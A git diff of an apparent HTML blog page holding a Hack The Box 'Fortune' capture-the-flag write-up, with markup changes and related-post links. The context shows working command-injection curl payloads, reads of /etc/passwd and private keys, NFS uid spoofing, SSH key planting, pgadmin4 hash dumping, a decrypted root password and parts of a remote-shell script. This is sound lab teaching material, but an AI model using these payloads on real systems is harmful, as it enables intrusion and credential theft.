@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<meta name="generator" content="Hugo 0.38.2" />
+<meta name="generator" content="Hugo 0.78.1" />
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
 <link rel="preload" href="https://alamot.github.io/css/noncrit.css" as="style" onload="this.rel='stylesheet'">
 <noscript><link rel="stylesheet" href="https://alamot.github.io/css/noncrit.css"></noscript>
@@ -155,7 +155,7 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "@type": "BlogPosting",
     "mainEntityOfPage":{
       "@type":"WebPage",
-      "@id":"https://alamot.github.io/"
+      "@id":"https:\/\/alamot.github.io\/"
     },
     "headline": "Fortune write-up |  ",
     "image": {
@@ -169,14 +169,14 @@ div.centered, p.centered, figcaption.centered, nav.centered, table.centered, h1.
     "author": {
       "@type": "Person",
       "name": "Antonios Tsolis",
-      "image": "https://alamot.github.io/images/logo.png"
+      "image": "https:\/\/alamot.github.io\/images/logo.png"
     },
     "publisher": {
       "@type": "Organization",
       "name": "",
       "logo": {
         "@type": "ImageObject",
-        "url": "https://alamot.github.io/images/logo.png",
+        "url": "https:\/\/alamot.github.io\/images/logo.png",
         "height": 60,
         "width": 60
       }
@@ -319,7 +319,7 @@ if (language) {
 
 <p>Let&rsquo;s scan the full range of TCP and UDP ports using my tool <a href="https://github.com/Alamot/code-snippets/blob/master/enum/htbscan.py" target="_blank">htbscan.py</a></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.127
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.127
 
 Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
 
@@ -350,13 +350,13 @@ PORT    STATE SERVICE    VERSION
 |_ssl-date: TLS randomness does not represent time
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
 Aggressive OS guesses: OpenBSD 4.0 (95%), OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (94%), OpenBSD 5.0 (94%), OpenBSD 5.0 - 5.8 (94%), OpenBSD 4.9 (93%), OpenBSD 4.6 (93%), FreeBSD 10.0-CURRENT (93%), OpenBSD 4.7 (92%), OpenBSD 6.0 (92%)
-No exact OS matches for host (test conditions non-ideal).</code></pre></div></div>
+No exact OS matches for host (test conditions non-ideal).</code></pre></div>
 
 <h2 id="port-80">Port 80</h2>
 
 <p>Let&rsquo;s brute-force directories and files on port 80 using gobuster:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ gobuster -u http://10.10.10.127 -w /opt/DirBuster/directory-list-2.3-medium.txt -t 50
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ gobuster -u http://10.10.10.127 -w /opt/DirBuster/directory-list-2.3-medium.txt -t 50
 
 =====================================================
 Gobuster v2.0.1              OJ Reeves (@TheColonial)
@@ -371,12 +371,12 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 2019/03/12 11:34:11 Starting gobuster
 =====================================================
 /fortune (Status: 301)
-/select (Method not allowed)</code></pre></div></div>
+/select (Method not allowed)</code></pre></div>
 
 <h2 id="port-443">Port 443</h2>
 
 <p>When we try to connect to port 443 (https), the browser ask us for a client certificate. We can run a <em>sslyze</em> scan to verify it and get more info:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sslyze --regular 10.10.10.127
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sslyze --regular 10.10.10.127
 
 ...
  CHECKING HOST(S) AVAILABILITY
@@ -407,7 +407,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
        Key Size:                          2048
        Exponent:                          65537 (0x10001)
        DNS Subject Alternative Names:     []
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <h1 id="exploitation">Exploitation</h1>
 
@@ -425,7 +425,7 @@ Gobuster v2.0.1              OJ Reeves (@TheColonial)
 <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span></code></pre></div></p>
 
 <p>The parameter &lsquo;db&rsquo; is vulnerable to command injection:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl -X POST http://10.10.10.127/select --data &#39;db=whatever|id&#39;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl -X POST http://10.10.10.127/select --data &#39;db=whatever|id&#39;
 
 &lt;!DOCTYPE html&gt;
 &lt;html&gt;
@@ -443,7 +443,7 @@ uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
 
 &lt;/pre&gt;&lt;p&gt;
 &lt;p&gt;Try &lt;a href=&#39;/&#39;&gt;again&lt;/a&gt;!&lt;/p&gt;
-&lt;/body&gt;</code></pre></div></div></p>
+&lt;/body&gt;</code></pre></div></p>
 
 <p>Thus, we have gained Remote Command Execution to this machine.</p>
 
@@ -466,29 +466,29 @@ uid=512(_fortune) gid=512(_fortune) groups=512(_fortune)
 <h2 id="acquiring-a-client-certificate">Acquiring a client certificate</h2>
 
 <p>If we search a little the home folders, we find some private keys:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatever|ls -al /home/bob/ca/intermediate/private/&#39;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatever|ls -al /home/bob/ca/intermediate/private/&#39;
 ...
 total 20
 drwxr-xr-x  2 bob  bob   512 Oct 29  2018 .
 drwxr-xr-x  7 bob  bob   512 Nov  3  2018 ..
 -r--------  1 bob  bob  1675 Oct 29  2018 fortune.htb.key.pem
 -rw-r--r--  1 bob  bob  3243 Oct 29  2018 intermediate.key.pem
-...</code></pre></div></div></p>
+...</code></pre></div></p>
 
 <p>Well, we don&rsquo;t have permissions to read fortune.htb.key.pem, but we can read intermediate.key.pem:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatevat|cat /home/bob/ca/intermediate/private/intermediate.key.pem&#39; | grep -zo &#39;\-\-.*\-\-&#39; &gt; intermediate.key.pem</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatevat|cat /home/bob/ca/intermediate/private/intermediate.key.pem&#39; | grep -zo &#39;\-\-.*\-\-&#39; &gt; intermediate.key.pem</code></pre></div></p>
 
 <p>Inside /home/bob/ca/intermediate/certs/ there is the respective certificate:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem&#39; | grep -zo &#39;\-\-.*\-\-&#39; &gt; intermediate.cert.pem</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent -X POST http://10.10.10.127/select --data &#39;db=whatever|cat /home/bob/ca/intermediate/certs/intermediate.cert.pem&#39; | grep -zo &#39;\-\-.*\-\-&#39; &gt; intermediate.cert.pem</code></pre></div></p>
 
 <p>We can combine the certificate and private key to a pkcs#12 file which we can import to our browser:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out client.p12
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ openssl pkcs12 -inkey intermediate.key.pem -in intermediate.cert.pem -export -out client.p12
 Enter Export Password: pass
-Verifying - Enter Export Password: pass</code></pre></div></div></p>
+Verifying - Enter Export Password: pass</code></pre></div></p>
 
 <p>Now, let&rsquo;s import client.p12 to your browser and visit <a href="https://10.10.10.147" target="_blank">https://10.10.10.147</a> (When we are being asked for it, we choose our recently imported client certificate. We also have to add an exception for the self-signed certificate of the website server). If we want to use curl the following command is sufficient:</p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127</code></pre></div></div>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127</code></pre></div>
 
 <div class="highlight"><pre class="chroma"><code class="language-html" data-lang="html"><span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="p">&lt;</span><span class="nt">html</span><span class="p">&gt;</span>
@@ -527,24 +527,24 @@ Please save the above key pair to your local system with appropriate file permis
 Please note: If the IP address of your local system changes, then you may need to generate a new key pair.</code></pre></div></p>
 
 <p>We can copy this private key and paste it into a file, but -as you have noticed- I prefer doing things a bit differently (^_^):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl --silent --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127/generate | grep -zo &#39;\-\-.*\-\-&#39; &gt; fortune_id_rsa</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl --silent --insecure --key intermediate.key.pem --cert intermediate.cert.pem https://10.10.10.127/generate | grep -zo &#39;\-\-.*\-\-&#39; &gt; fortune_id_rsa</code></pre></div></p>
 
 <p>Don&rsquo;t forget to set the required strict permissions:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">chmod 600 fortune_id_rsa</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">chmod 600 fortune_id_rsa</code></pre></div></p>
 
 <p>But for whom user is this key? Let&rsquo;s examine /etc/passwd
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ curl -X POST http://10.10.10.127/select --data &#39;db=whatever|cat /etc/passwd&#39;
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ curl -X POST http://10.10.10.127/select --data &#39;db=whatever|cat /etc/passwd&#39;
 
 root:*:0:0:Charlie &amp;amp;:/root:/bin/ksh
 ...
 charlie:*:1000:1000:Charlie:/home/charlie:/bin/ksh
 bob:*:1001:1001::/home/bob:/bin/ksh
-nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf</code></pre></div></div></p>
+nfsuser:*:1002:1002::/home/nfsuser:/usr/sbin/authpf</code></pre></div></p>
 
 <p>We notice that one user has been set for authpf as his user shell. Let&rsquo;s see what happens if we try to connect using this <strong><em>nfsuser</em></strong> user and the private key we acquired:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ssh -i fortune_id_rsa nfsuser@10.10.10.127
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ssh -i fortune_id_rsa nfsuser@10.10.10.127
 
-Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;</code></pre></div></div></p>
+Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;</code></pre></div></p>
 
 <p>OK. We have been authenticated but we cannot execute any command&hellip; What exactly is authpf?</p>
 
@@ -555,7 +555,7 @@ Hello nfsuser. You are authenticated from host &#34;10.10.12.134&#34;</code></pr
 <h2 id="2nd-enumeration-having-ntfuser-authenticated-to-authpf-via-ssh">2nd Enumeration (having ntfuser authenticated to authpf via ssh)</h2>
 
 <p>Let&rsquo;s try to enumerate the ports/services again. This time while we are authenticated to authpf as ntfuser via ssh (make sure you have/keep that ssh session open):
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.127
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo htbscan.py 10.10.10.127
 
 Running command: sudo masscan -e tun0 -p0-65535 --max-rate 500 --interactive 10.10.10.127
 
@@ -603,18 +603,18 @@ PORT     STATE SERVICE    VERSION
 |_http-server-header: OpenBSD httpd
 |_http-title: pgadmin4
 Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
-Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), FreeBSD 10.0-CURRENT (94%), OpenBSD 4.0 (94%), OpenBSD 5.0 (93%), OpenBSD 4.1 (93%), OpenBSD 4.6 (93%), OpenBSD 4.7 (93%), OpenBSD 6.0 (93%)</code></pre></div></div></p>
+Aggressive OS guesses: OpenBSD 4.4 - 4.5 (95%), OpenBSD 6.0 - 6.1 (95%), OpenBSD 5.0 - 5.8 (95%), FreeBSD 10.0-CURRENT (94%), OpenBSD 4.0 (94%), OpenBSD 5.0 (93%), OpenBSD 4.1 (93%), OpenBSD 4.6 (93%), OpenBSD 4.7 (93%), OpenBSD 6.0 (93%)</code></pre></div></p>
 
 <p>Wow! Now, we have access to more ports! We notice an nfs service:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ showmount -e 10.10.10.127
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ showmount -e 10.10.10.127
 
 Export list for 10.10.10.127:
-/home (everyone)</code></pre></div></div></p>
+/home (everyone)</code></pre></div></p>
 
 <h2 id="spoofing-uid-gid-using-nfsshell">Spoofing uid/gid using nfsshell</h2>
 
 <p>Neat, we have access to an nfs mount! We can use nfsshell to spoof our uid/gid:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nfsshell
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nfsshell
 nfs&gt; host 10.10.10.127
 Using a privileged port (1023)
 Open 10.10.10.127 (10.10.10.127) TCP
@@ -646,21 +646,21 @@ Unmount &#39;/home&#39;
 Close &#39;10.10.10.127&#39;
 
 $ cat user.txt
-ad****************************40</code></pre></div></div></p>
+ad****************************40</code></pre></div></p>
 
 <p>Alternatively, If you have a user with uid=1000, you can simply mount the nfs share and read charlie&rsquo;s files:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ mkdir mnt_point
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ mkdir mnt_point
 $ sudo mount -t nfs 10.10.10.127:/home mnt_point -o nolock
 $ cat mnt_point/charlie/user.txt
-ad****************************40</code></pre></div></div></p>
+ad****************************40</code></pre></div></p>
 
 <h2 id="getting-charlie-shell">Getting charlie shell</h2>
 
 <p>Of course we can add our public key to charlie&rsquo;s authorized_keys:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat ~/.ssh/id_rsa.pub &gt;&gt; mnt_point/charlie/.ssh/authorized_keys</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat ~/.ssh/id_rsa.pub &gt;&gt; mnt_point/charlie/.ssh/authorized_keys</code></pre></div></p>
 
 <p>Or we can use nfsshell for this as we did before:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ sudo nfsshell
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ sudo nfsshell
 nfs&gt; host 10.10.10.127
 Using a privileged port (1023)
 Open 10.10.10.127 (10.10.10.127) TCP
@@ -675,20 +675,20 @@ nfs&gt; put id_rsa.pub authorized_keys
 WARNING: Create failed: File exists
 nfs&gt; quit
 Unmount &#39;/home&#39;
-Close &#39;10.10.10.127&#39;</code></pre></div></div></p>
+Close &#39;10.10.10.127&#39;</code></pre></div></p>
 
 <p>Now, we can connect via SSH using public key authenticaion:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ ssh -i ~/.ssh/id_rsa2 charlie@10.10.10.127
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ ssh -i ~/.ssh/id_rsa2 charlie@10.10.10.127
 Last login: Sat Aug  3 04:36:55 2019 from 10.10.12.158
 OpenBSD 6.4 (GENERIC) #349: Thu Oct 11 13:25:13 MDT 2018
 
 Welcome to OpenBSD: The proactively secure Unix-like operating system.
-fortune$</code></pre></div></div></p>
+fortune$</code></pre></div></p>
 
 <h2 id="privilege-escalation">Privilege escalation</h2>
 
 <p>Let&rsquo;s examine what there is inside &lsquo;mbox&rsquo; file:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ cat mbox
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ cat mbox
 
 From bob@fortune.htb Sat Nov  3 11:18:51 2018
 Return-Path: &lt;bob@fortune.htb&gt;
@@ -711,17 +711,17 @@ BTW: I set the dba password to the same as root. I hope you don&#39;t mind.
 
 Cheers,
 
-Bob</code></pre></div></div></p>
+Bob</code></pre></div></p>
 
 <p>Password reuse&hellip; Let&rsquo;s search /var/appsrv/pgadmin4/pgadmin4.db:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep bob
+<div class="bg-black"><pre><code class="language-console" data-lang="console">fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep bob
 bob@fortune.htb$pbkdf2-sha512$25000$z9nbm1Oq9Z5TytkbQ8h5Dw$Vtx9YWQsgwdXpBnsa8BtO5kLOdQGflIZOQysAy7JdTVcRbv/6csQHAJCAIJT9rLFBawClFyMKnqKNL5t3Le9vg
 
 fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep charlie
 charlie@fortune.htb$pbkdf2-sha512$25000$3hvjXAshJKQUYgxhbA0BYA$iuBYZKTTtTO.cwSvMwPAYlhXRZw8aAn9gBtyNQW3Vge23gNUMe95KqiAyf37.v1lmCunWVkmfr93Wi6.W.UzaQ
 
 fortune$ strings /var/appsrv/pgadmin4/pgadmin4.db | grep dba
-postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22</code></pre></div></div></p>
+postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgESGzprefer&lt;STORAGE_DIR&gt;/.postgresql/postgresql.crt&lt;STORAGE_DIR&gt;/.postgresql/postgresql.key22</code></pre></div></p>
 
 <p>Luckily for us, pgadmin4 is open source. Let&rsquo;s grab this script:</p>
 
@@ -794,13 +794,13 @@ postgresdbautUU0jkamCZDmqFLOrAuPjFxL0zp8zWzISe5MF0GY/l8Silrmu3caqrtjaVjLQlvFFEgE
 
 <p>That is we use the &lsquo;decrypt&rsquo; function to decrypt dba&rsquo;s password which was encrypted using Bob&rsquo;s AES encyption key. PBKDF2 (Password-Based Key Derivation Function 2) is a key derivation function with a sliding computational cost (to reduce susceptibility to brute force attacks).
 We run the script and we get the password for root:
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">$ python crypto.py 
-b&#39;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&#39;</code></pre></div></div></p>
+<div class="bg-black"><pre><code class="language-console" data-lang="console">$ python crypto.py 
+b&#39;R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!&#39;</code></pre></div></p>
 
-<div class="bg-black"><div class="highlight"><pre class="chroma"><code class="language-console" data-lang="console">fortune$ su root
+<div class="bg-black"><pre><code class="language-console" data-lang="console">fortune$ su root
 Password: R3us3-0f-a-P4ssw0rdl1k3th1s?_B4D.ID3A!
 fortune# cat /root/root.txt
-33****************************f8</code></pre></div></div>
+33****************************f8</code></pre></div>
 
 <h1 id="bonus-script-rce2shell-py">Bonus script: rce2shell.py</h1>
 
@@ -852,7 +852,7 @@ fortune# cat /root/root.txt
 <span class="c1"># Redirect stderr to stdout?</span>
 <span class="n">ERR2OUT</span> <span class="o">=</span> <span class="bp">True</span>
 <span class="c1"># A unique sequence of characters that marks start/end of output.</span>
-<span class="n">UNIQUE_SEQ</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="nb">hex</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span>
+<span class="n">UNIQUE_SEQ</span> <span class="o">=</span> <span class="n">uuid</span><span class="o">.</span><span class="n">uuid4</span><span class="p">()</span><span class="o">.</span><span class="n">hex</span><span class="p">[</span><span class="mi">0</span><span class="p">:</span><span class="mi">6</span><span class="p">]</span>
 <span class="n">UNIX_TOOLS</span> <span class="o">=</span> <span class="p">{</span><span class="s2">&#34;b64enc&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;base64&#34;</span><span class="p">:</span><span class="s2">&#34;base64&#34;</span><span class="p">,</span>
                          <span class="s2">&#34;openssl&#34;</span><span class="p">:</span><span class="s2">&#34;openssl base64 -A&#34;</span><span class="p">},</span>
               <span class="s2">&#34;b64dec&#34;</span><span class="p">:</span> <span class="p">{</span><span class="s2">&#34;base64&#34;</span><span class="p">:</span><span class="s2">&#34;base64 -d&#34;</span><span class="p">,</span>
@@ -1027,7 +1027,7 @@ fortune# cat /root/root.txt
        <span class="s2">&#34;timeout&#34;</span><span class="p">:</span><span class="mi">30</span><span class="p">}</span>
 
 <span class="n">shell</span><span class="p">(</span><span class="n">rce</span><span class="o">=</span><span class="n">rce</span><span class="p">)</span>
-<span class="n">sys</span><span class="o">.</span><span class="nb">exit</span><span class="p">()</span>
+<span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
 
 
 <span class="s1">&#39;&#39;&#39;
@@ -1070,9 +1070,21 @@ fortune# cat /root/root.txt
            
            
            
-          
-           
-           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/falafel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/falafel.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Falafel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Falafel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">23 Jun 2018</time>
+      <time lang="el">23 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1106,9 +1118,93 @@ fortune# cat /root/root.txt
            
            
            
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/tally_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/dart.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Tally write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Tally</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 May 2018</time>
+      <time lang="el">03 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
           
            
            
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/node_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/jscode.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Node write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Node</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">03 Mar 2018</time>
+      <time lang="el">03 Μαρ 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fulcrum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/fulcrum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Fulcrum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Fulcrum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">09 Jun 2018</time>
+      <time lang="el">09 Ιουν 2018</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/fluxcapacitor_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/capacitors.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">FluxCapacitor write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του FluxCapacitor</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">13 May 2018</time>
+      <time lang="el">13 Μαϊ 2018</time>
+    </footer>
+  </a>
+</article>
+
            
           
            
@@ -1142,21 +1238,293 @@ fortune# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/nineveh_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/nineveh.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">Querier write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
+      <h3 class="title" lang="en">Nineveh write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Nineveh</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">22 Jun 2019</time>
-      <time lang="el">22 Ιουν 2019</time>
+      <time lang="en">17 Dec 2017</time>
+      <time lang="el">17 Δεκ 2017</time>
     </footer>
   </a>
 </article>
 
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/optimum_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/optimum.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Optimum write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Optimum</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">28 Oct 2017</time>
+      <time lang="el">28 Οκτ 2017</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">27 Jul 2019</time>
+      <time lang="el">27 Ιουλ 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+            <article class="li col-sm-6 col-md-4">
+  <a href="https://alamot.github.io/reddish_writeup/" class="clearfix">
+    <div class="cell">
+      <div class="image" style="background-image: url(https://alamot.github.io/images/reddish.jpg);"></div>
+    </div>
+    <footer>
+      <h3 class="title" lang="en">Reddish write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Reddish</h3>
+      <i class="fa fa-calendar"></i>
+      <time lang="en">26 Jan 2019</time>
+      <time lang="el">26 Ιαν 2019</time>
+    </footer>
+  </a>
+</article>
+
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
            
           
            
@@ -1202,17 +1570,93 @@ fortune# cat /root/root.txt
            
            
            
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
+          
+           
+           
+           
             <article class="li col-sm-6 col-md-4">
-  <a href="https://alamot.github.io/lacasadepapel_writeup/" class="clearfix">
+  <a href="https://alamot.github.io/querier_writeup/" class="clearfix">
     <div class="cell">
-      <div class="image" style="background-image: url(https://alamot.github.io/images/ace.jpg);"></div>
+      <div class="image" style="background-image: url(https://alamot.github.io/images/querier.jpg);"></div>
     </div>
     <footer>
-      <h3 class="title" lang="en">LaCasaDePapel write-up</h3>
-      <h3 class="title" lang="el">Ανάλυση του LaCasaDePapel</h3>
+      <h3 class="title" lang="en">Querier write-up</h3>
+      <h3 class="title" lang="el">Ανάλυση του Querier</h3>
       <i class="fa fa-calendar"></i>
-      <time lang="en">27 Jul 2019</time>
-      <time lang="el">27 Ιουλ 2019</time>
+      <time lang="en">22 Jun 2019</time>
